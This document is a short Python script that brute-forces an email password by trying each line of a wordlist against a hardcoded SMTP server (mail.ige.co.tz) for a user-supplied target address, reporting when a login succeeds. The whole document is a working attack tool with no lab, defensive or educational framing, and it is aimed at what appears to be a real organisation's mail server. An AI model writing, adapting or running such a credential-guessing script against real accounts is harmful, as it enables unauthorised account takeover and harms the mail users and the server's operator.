#!/usr/bin/python3

import smtplib
from termcolor import colored

smtpserver = smtplib.SMTP("mail.ige.co.tz",587)
smtpserver.ehlo()
smtpserver.starttls()

user = input("[*] Enter Target Email Address: ")
passwdfile = input("[*] Enter The Path To The Password File: ")
file = open(passwdfile,"r")

for password in file:
    password = password.strip("\n")
    try:
        smtpserver.login(user,password)
        print(colored("[*] Password FOund: %s" %password, 'green'))
        break
    except smtplib.SMTPAuthenticationError:
        print(colored("[*] Wrong Password " + password,'red'))  

